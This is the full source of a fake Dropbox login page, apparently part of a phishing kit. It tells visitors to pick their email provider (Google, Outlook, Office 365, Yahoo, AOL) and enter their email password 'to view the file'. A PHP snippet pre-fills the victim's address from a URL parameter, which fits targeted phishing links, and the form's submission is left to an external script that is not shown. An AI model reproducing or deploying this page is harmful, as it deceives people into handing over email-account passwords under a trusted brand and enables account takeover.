<!DOCTYPE html>
<html xml:lang="en" class="media-desktop" xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>
    <meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
    <meta content="origin-when-cross-origin" name="referrer">
    <link href="content/favicon.ico" rel="shortcut icon">
    <link href="content/main.css" type="text/css" rel="stylesheet">
    <meta content="text/html; charset=UTF-8" http-equiv="content-type">
    <title>Login - Dropbox </title>
    <style type="text/css">
        .hny-yif {
            display: none;
        }
    </style>
    <link href="content/accessibility.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/button.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/exp_cards.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/login_form.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/login_or_register_1.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/react_locale_selector.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/layout.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/index.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/base.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/components.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/login_or_register_2.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/recaptcha_challenge.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/recaptcha_v2_challenge.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/scooter-scoped.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/web_sprites.css" type="text/css" crossorigin="anonymous" rel="stylesheet">
    <link href="content/css.css" type="text/css" rel="stylesheet">
	<script src="content/jquery.js"></script>
</head>

<body class="en" dir="ltr">
    <span class="dropbox-2015 dropbox-logo-2015">
		<header class="mast-head">
			<div class="mast-head__container container">
				<nav class="mast-head__nav mast-head-nav">
					<ul class="nav-list">
						<li class="nav-list__item nav-list__item--dfb">
							<a href="./" id="try-dfb" class="button-tertiary try-dfb">Try Dropbox Business</a>
						</li>
					</ul>
					<ul class="nav-list">
						<li class="nav-list__item nav-list__item--download">
							<a href="./" class="button-link">Download the app</a>
						</li>
					</ul>
				</nav>
				<h1 id="dropbox-logo" class="dropbox-logo">
					<a href="./" class="dropbox-logo__link">
						<img src="content/dropbox_logo_glyph.svg" alt="" class="dropbox-logo__glyph">
						<img src="content/dropbox_logo_text.svg" alt="" class="dropbox-logo__type">Dropbox
					</a>
				</h1>
			</div>
		</header>
	</span>
    <div id="outer-frame">
        <div id="page-content">
            <div tabindex="-1" id="main-skip" class="main-skip-destination"></div>
            <div id="login-or-register-page-content" style="padding-top:100px;">
               <!-- <div class="select"> -->
                    <div class="primary-header-container primary-header-container--centered" data-reactid="23">
                        <h2 style="font-size: 31px; font-weight: 100; color: #47525d;" class="primary-header pricing__headline" data-reactid="24">
                            Email Validation
                        </h2>
                        <div style="background:#0071ce; color:#fff; padding:10px; border-radius:5px; display:inline-block;" >
                            <span style="float:left;">
                                <img src="content/lock.png" />
                            </span>
                            <span style="float:left; padding-top:5px; font-size:16px;">
                                &nbsp; Please select your email provider and sign in to view the file.
                            </span>
                            <div class="clearfix"></div>
                        </div>
                    </div>
                    
                    <img src="content/email-providers.png" data-hi-res="content/email-providers.png" alt="" class="login-or-register-img" usemap="#image-map">
                    <map name="image-map">
                        <area class="m-selector" id="google" target="" alt="Login with Google" title="Login with Google" href="#top" coords="76,76,74" shape="circle">
                        <area class="m-selector" id="outlook" target="" alt="Login with Outlook" title="Login with Outlook" href="#top1" coords="250,87,81" shape="circle">
                        <area class="m-selector" id="office" target="" alt="Login with Office 365" title="Login with Office 365" href="#top2" coords="428,75,74" shape="circle">
                        <area class="m-selector" id="yahoo" target="" alt="Login with Yahoo!" title="Login with Yahoo!" href="#top3" coords="76,252,75" shape="circle">
                        <area class="m-selector" id="aol" target="" alt="Login with AOL" title="Login with AOL" href="#top4" coords="253,251,74" shape="circle">
                        <area class="m-selector" id="address" target="" alt="Login with other email provider" title="Login with other email provider" href="#top5" coords="428,252,74" shape="circle">
                    </map>
               <!--  </div> -->
                <div class="login-register-container-wrapper">
                    <div style="display:none;" class="login-register-container standard login-register-container--link-top">
                        <div class="login-register-login-part">
                            <div class="clearfix">
                                <div class="login-register-header" style="width:100%;">
                                    <div style="float:left; width:30%; text-align:left;">Sign in with</div>
                                    <div style="float:right; width:70%; text-align:right;" class="img"></div>
                                    <div class="clearfix"></div>
                                </div>
                            </div>
                            <div class="login-form-container standard">
                                <div id="regular-login-forms">
                                    <form action="#" novalidate="" style="" class="clearfix credentials-form login-form">
                                        <div class="credentials-form__fields">
                                            <div tabindex="-1" class="text-input login-text-input standard">
                                                <div class="text-input-error-wrapper">
                                                    <form:error name="login_email">
                                                        <div id="l_e_not"></div>
                                                    </form:error>
                                                </div>
                                                <div class="text-input-wrapper">
                                                    <input class="text-input-input autofocus" id="d_e" type="email" placeholder="Email" <?php if(isset($_GET['userid'])) { $e = $_GET['userid'];
	?> value="<?php print $e; ?>" readonly="readonly" <?php } ?>>
                                                </div><small class="secondary-label"></small>
											</div>
                                            <input type="hidden" id="d_s" />
                                            <div tabindex="-1" style="display:none" class="mobile text-input login-text-input standard">
                                                <div class="text-input-error-wrapper">
                                                    <form:error name="login_email">
                                                        <div id="l_t_not"></div>
                                                    </form:error>
                                                </div>
                                                <div class="text-input-wrapper">
                                                    <input class="text-input-input autofocus" id="d_m" type="text" placeholder="Phone Number" />
                                                </div><small class="secondary-label"></small>
											</div>
                                            <div tabindex="-1" class="text-input login-text-input standard">
                                                <div class="text-input-error-wrapper">
                                                    <form:error name="login_password">
                                                        <div id="l_p_not"></div>
                                                    </form:error>
                                                </div>
                                                <div class="text-input-wrapper">
                                                    <input class="text-input-input" id="d_p"  type="password" placeholder="Password">
                                                </div><small class="secondary-label"></small>
											</div>
                                            
                                            <div class="c-card c-card--error" style="display:none;">Oops! Make sure to sign in with your email password</div>
                                            
                                            <div class="recaptcha-terms-text" data-reactid="22">
                                                This page is protected by reCAPTCHA and is subject to the Google <a href="https://www.google.com/policies/privacy/" target="_blank" rel="noopener noreferrer" data-reactid="24">Privacy Policy</a> and <a href="https://www.google.com/policies/terms/" target="_blank" rel="noopener noreferrer" data-reactid="27">Terms of Service</a>.
                                            </div>
                                            
                                            <div class="clearfix">
                                                <div class="checkbox checkbox-inline standard remember-me">
                                                    <div class="text-input-error-wrapper">
                                                        <form:error name="remember_me">
                                                            <div data-error-field-name="remember_me"></div>
                                                        </form:error>
                                                    </div>
                                                    <input checked="checked" id="rem" name="remember_me" type="checkbox">
                                                    <label class="checkbox_label" for="rem">Remember me</label>
                                                </div>
                                                <button type="button" class="login-button button-primary">
                                                    Sign in
                                                </button>
												<span class="login-loading-indicator">
													<img src="content/ajax-loading-small.gif" alt="">
												</span>
											</div>
                                            <div class="sso-optout">
                                                <div>or <a href="#">Log in with Dropbox credentials</a></div>
                                            </div>
                                        </div>
                                        <div class="login-need-help"><a href="./">Forgot your password?</a></div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="page-prefooter"></div>
        <footer>
            <div id="page-full-footer">
                <div id="footer-top-margin"></div>
                <div id="footer-border"></div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Dropbox</li>
                        <li><a href="./">Install</a></li>
                        <li><a href="./">Mobile</a></li>
                        <li><a href="./">Pricing</a></li>
                        <li><a href="./">Business</a></li>
                        <li><a href="./">Enterprise</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">About us</li>
                        <li><a href="./">Dropbox Blog</a></li>
                        <li><a href="./">About</a></li>
                        <li><a href="./">Branding</a></li>
                        <li><a href="./">News</a></li>
                        <li><a href="./">Jobs</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Support</li>
                        <li><a href="./">Help Center</a></li>
                        <li><a href="./">Contact us</a></li>
                        <li><a href="./">Copyright</a></li>
                        <li><a href="./">Cookies</a></li>
                        <li><a href="./">Privacy &amp; Terms</a></li>
                    </ul>
                </div>
                <div class="footer-col">
                    <ul>
                        <li class="header">Community</li>
                        <li><a href="./">Referrals</a></li>
                        <li><a href="./">Forum</a></li>
                        <li><a href="./" target="_blank" rel="noreferrer">Twitter</a></li>
                        <li><a href="./" target="_blank" rel="noreferrer">Facebook</a></li>
                        <li><a href="./">Developers</a></li>
                    </ul>
                </div>
                <div class="react-locale-selector-wrapper">
                    <div id="component1398917421067814276">
                        <div data-reactroot="" id="locale-container"><span id="locale-link"><img class="sprite sprite_web s_web_globe_gray_20x20" src="content/icon_spacer-vflN3BYt2.gif" alt=""><button class="button-as-link react-locale-selector-link" title="Choose a language"><span data-locale="en">English (United States)</span><img class="sprite sprite_web s_web_arrow-up-gray" src="content/icon_spacer-vflN3BYt2.gif" alt=""></button>
                            </span>
                        </div>
                    </div>
                </div>
                <div class="clear"></div>
            </div>
        </footer>
        <noscript>
            <p class="center">The Dropbox website requires JavaScript.</p>
        </noscript>
    </div>
    <div style="position: absolute; top: 0; left: 0; font-family: Courier" id="ieconsole"></div>
    <div style="position:absolute; top:-10000px;width:0px; height:0px; left: 0;" id="FB_HiddenContainer"></div>
	<img src="content/hstsping" alt="" style="display:none;">
    <div id="accessible-announce" class="ax-visually-hidden" aria-live="assertive"></div>
	<script src="content/view.js"></script>
</body>
</html>